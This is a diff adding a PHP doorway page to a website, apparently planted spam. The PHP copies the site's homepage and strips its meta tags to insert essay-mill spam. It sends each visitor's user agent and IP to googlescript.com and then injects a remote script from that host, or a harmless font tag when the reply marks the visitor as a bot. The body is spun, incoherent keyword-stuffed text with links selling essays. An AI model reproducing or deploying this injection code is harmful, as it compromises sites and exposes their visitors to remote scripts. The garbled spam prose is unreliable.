@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Where To Buy College Papers Sunk Rises Committeesthe where to buy college papers Parking Fatigued Developmental Rash Na | purplecube.in</title>
+<meta name="description" content="We couldn t get her to improve her head. | Where To Buy College Papers" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>where to buy college papers Lovingly Flyer Korbett</h1>Practice expense RVU - represents non-physician costs, excluding malpractice costs. <p>It is important to these problems, and at the same time not to offend anyone. In many cases and in many situations it is very useful to have connections and constant cooperation that will enhance <a href="http://purplecube.in/buy-tok-essay">buy tok essay</a> force of the government. I would recommend it!!. Get inspired by our other sample papers and free essays. The where to buy college papers beach also is better than the city on vacation because it is always pleasant to relax from busy city and from people above all. Also, if we will take into account huge U. Why it is better to buy vs.</p> <h2>Ad use mind-mapping for connecting the ideas using one site obtain sample checks with replies.</h2>Beach Vs City on Vacation The beach is a place that is very attractive for recreational purposes, and the city on vacation is a perfect place for the active personal mission statement examples pdf with a lot of travelling and plenty of impressions and new experiences. <p>You are always welcome to get inspired by our sample papers. To begin with it should be <strong>where to buy college papers</strong> noted that today our society personal mission statement examples pdf significant assortment of different devices for work and leisure. Immigration fosters social change. The beach unites us with the weather and helps us forget all our problems and our constant rush the city. It should be noted that conflict theorists have their <a href="http://purplecube.in/is-custom-essay-good">is custom essay good</a> own view on immigration and social change. Missioon of hearing can occur itself in different styles, with varying degrees of severity. In turn, prospective payment includes following categories operating payment, capital payment and outlier payment.</p> <h2>This isn t considered a confident profile that was online at-all.</h2>It can be said that immigration is an engine of social change. <p>Work RVU - represents physician time, skill level, stress and other related factors. Malpractice RVU - represents the cost of malpractice <strong>where to buy college papers</strong> insurance, according where to buy college papers to Fisher, This is called limiting charge. If the tourist flow is reversible, for instance to personal mission statement examples pdf to another region in the short term citizen returns to his place of permanent residence, the migration flow or completely irreversible, or its reverse motion moved for a long time. That is why there is only one easy way to achieve the desired results - to promote <a href="http://purplecube.in/buy-essay-writers-account">buy essay writers account</a> the interests and the information that is needed to be promoted by the government - with the help of <a href="http://purplecube.in/write-your-essay-for-you">write your essay for you</a> the mass media. The modern world is becoming more and more are particularly evident in Western Europe, where the Schengen agreement virtually erased borders and entered the single currency even more emphasized common economic space. Loss of hearing can have a significant impact on human life and may even increase the risk of developing voice disorders.</p> <h2>Other folks will probably like it, and, in most cases, you will see more fans than haters.</h2>The payment rates are where to buy college papers the product of three relative values and geographic cost indexes <strong>where to buy college papers</strong> and a conversion factor. <p>Body senses and motor control Motor control - is motor activity of an organism or individual organs. Writer fully followed the instructions. It is essential to note that there are attitudes to immigration that are caused by the view that immigrants may threaten certain opportunities of the native citizens. Body senses - is formed in the process of evolution specialized peripheral anatomical and physiological system that provides <a href="http://purplecube.in/custom-college-essay">custom college essay</a> due to its receptors on the receipt and initial analysis of information from the outside world and from other organs of the body, that is, from external and internal environment. These areas are interrelated, although many people have never thought about it. where to buy college papers Meningitis and otitis media also have a risk of hearing damage. Consequently, burden to the Medicare program and state budget will significantly increase.</p> <h2>Many of them are skiers annoyed by the expenses of european skiing.</h2>Nowadays it is essential to show all the sides of the situation, as there are so many sources of information that people anyway are able to check whether it is true. <p>They see that there is <strong>where to buy college papers</strong> an attitude change and other changes that affect the society. This clearly shows two streams the tourist and migration. Under the motor skills personal mission statement examples pdf understands the sequence of movements, which together are necessary to perform a certain task. Montreal located in the southwestern part of the province of Quebec, a large industrial, scientific and cultural center. This problem is solved successfully in America, and American democracy makes the next step - it begins to focus on the rights of minorities racial, ethnic, and now sexual. As a matter of fact, Jazz age for Harlem has become also home to a seductive, demi-monde of speakeasies and nightclubs.</p> <h2>Recognize their expenses and gives the perfect as possible provide.</h2>Integrative trends apply not only to movements of goods, capital and production capacity, but also the movement of people. <p>Simple tasks such as reaching for a cup of coffee are actually surprisingly complex. Also, there are Medicare payment rates for 7. The only official language of Montreal is French, despite the significant presence of English-speaking population. The Beach is used as a place of public entertainment, swimming and taking sun and air baths and it is also perfect for the calm vacation. Also I would provide pros and cons of each device. Tourism can be reviewed as a positive phenomenon.</p> <h2>at this time, those two views won t get in touch.</h2>However, the specific values vary by states. <p>Many people just perceive the information they see or hear and think that they have heard the only right version that exists. Hearing loss in this case can be temporary or permanent. It should be mentioned that the payment rates are the product of three relative values and geographic cost indexes and a conversion factor. Vacation at the beach is better than the city on vacation because there is calmer and the air is clean and great for the health. As a fact, currently in the Personal mission statement examples pdf, there is a strong tendency for further aging of the population, which will lead to the further increase of elderly population in the country. International experience, current trends and innovations personal mission statement examples pdf to put American legal profession to personal mission statement examples pdf new level.</p> <h2>This is for going your change initiative forward, your technique.</h2>The vacation on beach is a perfect place to think over important issues, to relax and to communicate with parents, relatives or friends. <p>Professions have become international and more oriented at multicultural interests. Later, Richard Mision modeled himself on Oscar Wilde and other literary characters, for example as the Peter Whiffle - a significant hero of Carl Van Vechten's 1922 novel.</p>
+                  </div>
+               </div>
